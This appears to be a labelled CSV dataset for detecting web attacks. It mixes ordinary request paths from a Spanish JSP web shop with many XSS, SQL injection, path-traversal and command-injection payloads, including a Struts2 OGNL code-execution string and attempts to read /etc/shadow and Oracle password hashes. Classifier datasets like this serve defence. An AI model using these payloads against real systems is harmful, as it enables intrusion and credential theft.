payload,type
publico/registro.jsp?modo=registro&login=grueneic&password=peraltar&nombre=Cenobia&apellidos=Elizarzu+Aguilocho&email=akashi1%40g-audio.td&dni=12796200N&direccion=Calle+Marsella+S%2FN%2C+&ciudad=Benidorm&cp=18708&provincia=Barcelona&ntc=8624528544448425&B1=Registrar,normal
global/estilos.css,normal
miembros/fotos.jsp,normal
publico/autenticar.jsp?modo=entrar&login=shay-pin&pwd=pajO&remember=on&B1=Entrar,normal
miembros/salir.jsp,normal
""";alert('XSS');//",xss
miembros/editar.jsp?modo=registro&login=faraday&password=8Ef6NDo&nombre=Xixia&apellidos=Paula+Pladellorens&email=euzaine%40schnapps.com.gs&dni=85744372G&direccion=Santa+Barbara+28+&ciudad=Cenicientos&cp=22232&provincia=Lugo&ntc=7057231009442608&B1=Registrar,normal
"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",xss
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=65&B1=A%F1adir+al+carrito,normal
publico/carrito.jsp,normal
imagenes/nuestratierra.jpg,normal
index.jsp,normal
"s1c: select * from users where id=1 or ""1#"" or 1=1 -- 1",sqli
publico/caracteristicas.jsp?id=2,normal
miembros/imagenes/zarauz.jpg,normal
global/estilos.css,normal
miembros/imagenes/zarauz.jpg,normal
"<a href=""jav&#97ascript:javascript:alert(1)"">test1</a>",xss
"<svg onload=""javascript:alert(123)"" xmlns=""#""></svg>",xss
imagenes/1.gif,normal
&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;,xss
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i",sqli
"""<div style=""""width: expression(document.write(""""XSS-XSS-XSS""""););"""">""",xss
miembros/fotos.jsp,normal
publico/pagar.jsp?modo=insertar&precio=8322&B1=Confirmar,normal
"<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>",xss
"<;/TITLE>;<;SCRIPT>;alert(""XSS"");<;/SCRIPT>;",xss
imagenes/3.gif,normal
global/estilos.css,normal
"s),s: select * from users where id=1 or ""),"" or 1=1 -- 1",sqli
"<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",xss
publico/pagar.jsp?modo=insertar&precio=5696&B1=Confirmar,normal
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=37&B1=A%F1adir+al+carrito,normal
publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=85&cantidad=77&B1=A%F1adir+al+carrito,normal
imagenes/nuestratierra.jpg,normal
/XSS STYLE=xss:expression(alert('XSS'))>,xss
global/menum.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
<IMG SRC=JaVaScRiPt:alert('XSS')>,xss
publico/pagar.jsp?modo=insertar&precio=1882&B1=Confirmar,normal
soov&: select * from users where id='1' <@&@ or 1=1 -- 1',sqli
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss
"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",xss
width: expression((window.r==document.cookie)?'':alert(r=document.cookie)),xss
"&lt;IMG \""\""\""&gt;&lt;SCRIPT&gt;alert(\""XSS\"")&lt;/SCRIPT&gt;\""&gt;",xss
global/titulo.jsp,normal
"<a onmouseover=""alert(document.cookie)"">xxs link</a>",xss
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",xss
"<a href=""\x11javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\xE2\x80\x86javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"&lt;!--#exec cmd=\""/bin/echo '&lt;SCR'\""--&gt;&lt;!--#exec cmd=\""/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\""--&gt;",xss
miembros/fotos.jsp,normal
imagenes/1.gif,normal
<svg><script onlypossibleinopera:-)> alert(1),xss
imagenes/logo.gif,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
global/creditos.jsp,normal
miembros/editar.jsp?modo=registro&login=szeto&password=d%E9cada&nombre=Saturnina&apellidos=Pin%F3s+Turrubiartes&email=delpy_wrixon%40tecnoindomo.gs&dni=15314533Y&direccion=Calle+Madre+De+Dios%2C+102+&ciudad=Perafort&cp=37500&provincia=C%E1ceres&ntc=9634788762109730&B1=Registrar,normal
..%c0%af..%c0%af{FILE},traversal
publico/caracteristicas.jsp?id=2,normal
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=20&B1=A%F1adir+al+carrito,normal
"<? echo('<scr)'; echo('ipt>alert(""XSS"")</script>'); ?>   ",xss
publico/pagar.jsp?modo=insertar&precio=928&B1=Confirmar,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
imagenes/2.gif,normal
"<a href=""\xE2\x80\x85javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<img[a][b][c]src[d]=x[e]onerror=[f]""alert(1)"">",xss
miembros/imagenes/zarauz.jpg,normal
miembros/index.jsp,normal
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',xss
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",xss
"<img src=x\x12onerror=""javascript:alert(1)"">",xss
publico/caracteristicas.jsp?id=2,normal
"<a href=""\xE2\x80\x87javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
....\....\....\....\{FILE},traversal
"s&vvU: select * from users where id='1' or @ @1=1 union select 1,version() -- 1'",sqli
ov&1c: select * from users where id=1 &@ or 1=1 -- 1,sqli
publico/miembros.jsp,normal
miembros/index.jsp,normal
..../..../..../..../..../..../..../{FILE},traversal
publico/autenticar.jsp?modo=entrar&login=mame&pwd=alAR1aDo0&remember=off&B1=Entrar,normal
publico/miembros.jsp,normal
"<img SRC=""javascript:document.vulnerable=true;"">",xss
global/estilos.css,normal
"${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]=""cmd"",%23ssss[1]=""%2fC"",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt",code_injection
miembros/index.jsp,normal
publico/productos.jsp,normal
miembros/imagenes/ogono.jpg,normal
"<a href=""\xE2\x80\x83javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
global/estilos.css,normal
<script>alert(1)</script>,xss
publico/autenticar.jsp?modo=entrar&login=conroy7&pwd=nordes%21tal&remember=off&B1=Entrar,normal
miembros/fotos.jsp,normal
..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE},traversal
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",xss
publico/autenticar.jsp?modo=entrar&login=leonard&pwd=escasamente&remember=off&B1=Entrar,normal
global/creditos.jsp,normal
"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
global/menum.jsp,normal
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE},traversal
global/creditos.jsp,normal
"<IMG SRC=x onplaying=""alert(String.fromCharCode(88,83,83))"">",xss
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera},xss
imagenes/logo.gif,normal
"""<STYLE>BODY{-moz-binding:url(""""http://ha.ckers.org/xssmoz.xml#xss"""")}</STYLE>""",xss
"""<STYLE type=""""text/css"""">BODY{background:url(""""javascript:alert('XSS')"""")}</STYLE>""",xss
imagenes/1.gif,normal
<IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>,xss
'<script>window.onload=function(){document.forms[0].message.value='1';}</script>,xss
"s1:s: select * from users where id=1 or ""1:"" or 1=1 -- 1",sqli
1 and user_name() = 'dbo',sqli
publico/caracteristicas.jsp?id=1,normal
imagenes/nuestratierra.jpg,normal
"&oo1U: select * from users where id=1 or \< =1 union select 1,@@VERSION -- 1",sqli
miembros/index.jsp,normal
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,xss
"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>",xss
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
"ABC<div style=""x:\x09expression(javascript:alert(1)"">DEF",xss
"s&o1U: select * from users where id='1' or !<1 union select 1,version() -- 1'",sqli
"<body onkeyup body onkeyup=""javascript:javascript:alert(1)""></body onkeyup>",xss
' or a=a--,sqli
miembros/imagenes/ogono.jpg,normal
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,command_injection
<iframe src=http://ha.ckers.org/scriptlet.html <,xss
imagenes/2.gif,normal
miembros/imagenes/ogono.jpg,normal
"'>//\\,<'>"">"">""*""",xss
imagenes/2.gif,normal
publico/registro.jsp?modo=registro&login=amabelle&password=COmplEtoRio&nombre=Samuel&apellidos=Bail%E9n+Lapetini&email=novikoff%40schnapps.com.cl&dni=42010181Z&direccion=Caba%F1eros%2C+131+&ciudad=Almacelles&cp=43896&provincia=%C1vila&ntc=6273831231107298&B1=Registrar,normal
imagenes/nuestratierra.jpg,normal
..0x2f..0x2f{FILE},traversal
<input value=<><iframe/src=javascript:confirm(1),xss
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,xss
"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(1)>"">",xss
publico/caracteristicas.jsp?id=1,normal
"<svg xmlns=""#""><script>alert(1)</script></svg>",xss
imagenes/logo.gif,normal
imagenes/logo.gif,normal
miembros/fotos.jsp,normal
"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",xss
..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE},traversal
<marquee onstart='javascript:alert('1');'>=(◕_◕)=,xss
""" onfocus=alert(document.domain) ""> <""   ",xss
publico/productos.jsp,normal
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",xss
miembros/fotos.jsp,normal
"""><img src=x onerror=window.open('https://www.google.com/');>",xss
publico/pagar.jsp?modo=insertar&precio=5093&B1=Confirmar,normal
publico/miembros.jsp,normal
..%%32%66..%%32%66..%%32%66..%%32%66{FILE},traversal
miembros/imagenes/castro.jpg,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
/../../../../../../../../../../../boot.ini%00.html,traversal
"<div style=""font-family:foo}color=red;"">XXX",xss
tz_offset,sqli
imagenes/logo.gif,normal
".onUE: select * from users where id=1.<@$ union select 1,version() -- 1",sqli
"<;STYLE TYPE="";text/javascript"";>;alert(';XSS';);<;/STYLE>;",xss
imagenes/3.gif,normal
1oo1&: select * from users where id=1 + \+%1 or 1=1 -- 1,sqli
"""<HTML><BODY><?xml:namespace prefix=""""t"""" ns=""""urn:schemas-microsoft-com:time""""><?import namespace=""""t"""" implementation=""""#default#time2""""><t:set attributeName=""""innerHTML"""" to=""""XSS<SCRIPT DEFER>alert(""""XSS"""")</SCRIPT>""""></BODY></HTML>""",xss
&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
publico/autenticar.jsp?modo=entrar&login=magdalen1&pwd=30hi6h571Ar&remember=on&B1=Entrar,normal
publico/registro.jsp?modo=registro&login=darbie&password=nu%F1o&nombre=Galatas&apellidos=Hormachea+Vilamasa&email=berghof%40esbien.bt&dni=06434691G&direccion=Glorieta+Mineros%2C+3%2C+&ciudad=Salobral&cp=37799&provincia=Cuenca&ntc=6262014386687000&B1=Registrar,normal
publico/autenticar.jsp?modo=entrar&login=jayavant&pwd=2s323a657a679&remember=on&B1=Entrar,normal
miembros/editar.jsp?modo=registro&login=rosche7&password=ber269U31a&nombre=Veneranda&apellidos=Ibero+Saborit&email=taneda%40ajuntamentdebcn20.be&dni=27415264T&direccion=C%2F+1+Sur+S%2FN+12%3FG&ciudad=Millana&cp=44366&provincia=Navarra&ntc=3796618492569421&B1=Registrar,normal
"'""""><script language=""JavaScript""> alert('X nS nS');</script>   ",xss
"""`'><script>\xE2\x80\xA9javascript:alert(1)</script>",xss
</script><script>alert(1)</script> ,xss
&#X000003c;,xss
publico/autenticar.jsp?modo=entrar&login=raing&pwd=zaca2%ED7&remember=on&B1=Entrar,normal
index.jsp,normal
" <HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
"window.alert(""Bonjour !"");",xss
"snUEs: select * from users where id=1 or 1#""$ union select 'a',version() -- 1",sqli
global/estilos.css,normal
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss
\u003c,xss
miembros/editar.jsp?modo=registro&login=naresh&password=72nt89CT7V1&nombre=Eulalio&apellidos=Escudero+Ostria&email=gorse%4016horas.yu&dni=86274990N&direccion=Calle+Fermin+Salvochea+155+&ciudad=Alcolea+del+Pinar&cp=14230&provincia=Teruel&ntc=0981560265462116&B1=Registrar,normal
&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;,xss
;id|,command_injection
&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&apos;XSS&apos;);&quot;&gt;]]&gt;,xss
publico/productos.jsp,normal
miembros/imagenes/ogono.jpg,normal
publico/pagar.jsp?modo=insertar&precio=8285&B1=Pasar+por+caja,normal
..\..\..\..\..\..\..\..\..\..\etc\shadow,traversal
"&lt;STYLE&gt;BODY{-moz-binding&#58;url(\""http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\"")}&lt;/STYLE&gt;",xss
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->,xss
..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE},traversal
"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",xss
%252e%252e\%252e%252e\{FILE},traversal
imagenes/1.gif,normal
<;IMG SRC=javascript:alert(';XSS';)>;,xss
imagenes/2.gif,normal
publico/miembros.jsp,normal
<SCRIPT SRC=//ha.ckers.org/.j>,xss
index.jsp,normal
publico/caracteristicas.jsp?id=1,normal
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE},traversal
"<iframe src=""javascript:alert('XSS by \nxss');""></iframe><marquee><h1>XSS by xss</h1></marquee>",xss
imagenes/1.gif,normal
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera},xss
publico/pagar.jsp?modo=insertar&precio=2304&B1=Confirmar,normal
imagenes/logo.gif,normal
index.jsp,normal
"""'`><\x00img src=xxx:x onerror=javascript:alert(1)>",xss
"<body onPopState body onPopState=""javascript:javascript:alert(1)""></body onPopState>",xss
miembros/fotos.jsp,normal
&#60;IMG SRC&#61;&#34; &#38;&#35;14&#59; javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;,xss
global/creditos.jsp,normal
"<XSS STYLE=""behavior: url(http://ha.ckers.org/xss.htc);"">",xss
global/creditos.jsp,normal
admin') or ('1'='1'#,sqli
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",xss
"<iframe onload iframe onload=""javascript:javascript:alert(1)""></iframe onload>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
<IMG SRC=javascript:alert(&quot;XSS&quot;)>,xss
publico/miembros.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"&(1UE: select * from users where id=1 or (\+)=1 union select 1,@@VERSION -- 1",sqli
publico/miembros.jsp,normal
global/creditos.jsp,normal
"""/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />",xss
"<IMG SRC=x onplay=""alert(String.fromCharCode(88,83,83))"">",xss
"<;TABLE>;<;TD BACKGROUND="";javascript:alert(';XSS';)"";>;<;/TD>;<;/TABLE>;",xss
imagenes/2.gif,normal
miembros/index.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/fotos.jsp,normal
"&lt;EMBED SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\"" AllowScriptAccess=\""always\""&gt;&lt;/EMBED&gt;",xss
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE},traversal
') or ('x')=('x,sqli
<script>({0:#0=alert/#0#/#0#(0)})</script>,xss
imagenes/1.gif,normal
"ABC<div style=""x:\xE2\x80\x82expression(javascript:alert(1)"">DEF",xss
imagenes/cmenbul.gif,normal
'sqlvuln,sqli
global/titulo.jsp,normal
"<a href=""\xE2\x80\x88javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
imagenes/cmenbul.gif,normal
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE},traversal
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../{FILE},traversal
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',xss
global/menum.jsp,normal
global/titulo.jsp,normal
imagenes/cmenbul.gif,normal
"<div datafld=""b"" dataformatas=""html"" datasrc=""#X""></div>",xss
..%252f..%252f..%252f{FILE},traversal
%252e%252e/%252e%252e/{FILE},traversal
' or ''*',sqli
miembros/index.jsp,normal
"<script src=""data:text/javascript,alert(1)""></script>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
global/titulo.jsp,normal
index.jsp,normal
publico/autenticar.jsp?modo=entrar&login=ann-mari&pwd=a7P9I9bL2&remember=on&B1=Entrar,normal
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",xss
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE},traversal
imagenes/3.gif,normal
global/titulo.jsp,normal
"<;A HREF="";http://0x42.0x0000066.0x7.0x93/"";>;XSS<;/A>;",xss
publico/registro.jsp?modo=registro&login=horatio&password=B%C1l%21tEo&nombre=Noem%ED&apellidos=Ponsati+Puratic&email=vladimirov%40saludyfitness.br&dni=31358386W&direccion=Burgos%2C+40%2C+7%3FA&ciudad=Geria&cp=18347&provincia=Valladolid&ntc=6368525574749403&B1=Registrar,normal
"s:?s: select * from users where id=1 or "":]"" or 1=1 -- 1",sqli
publico/miembros.jsp,normal
' having 1=1--,sqli
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/imagenes/zarauz.jpg,normal
global/estilos.css,normal
global/titulo.jsp,normal
publico/autenticar.jsp?modo=entrar&login=hanspete&pwd=PASteLeAr&remember=off&B1=Entrar,normal
imagenes/2.gif,normal
publico/miembros.jsp,normal
..%5c..%5c..%5c..%5c..%5c..%5c{FILE},traversal
n.&1c: select * from users where id=1 +$ . or 1=1 -- 1,sqli
miembros/fotos.jsp,normal
publico/registro.jsp?modo=registro&login=ferreira5&password=recomendaci%24%F3n&nombre=Salvatore&apellidos=Fortuny+Goyenaga&email=vree%40eddydaniele.tm&dni=01067171V&direccion=Calle+Betanzos%2C+S%2FN+&ciudad=Torre+de+Esteban+Hambr%E1n%2C+La&cp=24429&provincia=Castell%F3n&ntc=1290238048117290&B1=Registrar,normal
..\\..\\..\\..\\..\\{FILE},traversal
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E,xss
global/menum.jsp,normal
miembros/imagenes/zarauz.jpg,normal
%2e%2e%2f{FILE},traversal
"<script\x09type=""text/javascript"">javascript:alert(1);</script>",xss
"<BODY BACKGROUND=""javascript:alert('XSS')"">",xss
"<IMG SRC=""jav&#x0A;ascript:alert(<WBR>'XSS');"">",xss
.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\{FILE},traversal
publico/autenticar.jsp?modo=entrar&login=meloling&pwd=op0o62i4&remember=off&B1=Entrar,normal
publico/miembros.jsp,normal
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",xss
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",xss
publico/pagar.jsp?modo=insertar&precio=1433&B1=Confirmar,normal
publico/caracteristicas.jsp?id=1,normal
..%255c..%255c..%255c..%255c..%255c{FILE},traversal
&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;,xss
miembros/index.jsp,normal
s&o.&: select * from users where id='1' or \<\. or 1=1 -- 1',sqli
"<DIV STYLE=""width: expression(alert('XSS'));"">",xss
"<script>alert(string.fromcharcode(88,83,83))</script>",xss
imagenes/cmenbul.gif,normal
miembros/index.jsp,normal
imagenes/2.gif,normal
publico/registro.jsp?modo=registro&login=mazarick1&password=l5r78gea&nombre=Rakin&apellidos=Pampanas+Soto&email=lachens%40prestoesesto.py&dni=39672063F&direccion=Calle+Finlandia%2C+46%2C+6-A&ciudad=Salobral&cp=25187&provincia=Granada&ntc=9571001152380461&B1=Registrar,normal
publico/pagar.jsp?modo=insertar&precio=2993&B1=Pasar+por+caja,normal
publico/autenticar.jsp?modo=entrar&login=nessa&pwd=copa&remember=off&B1=Entrar,normal
index.jsp,normal
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE},traversal
global/estilos.css,normal
publico/miembros.jsp,normal
publico/pagar.jsp?modo=insertar&precio=4748&B1=Pasar+por+caja,normal
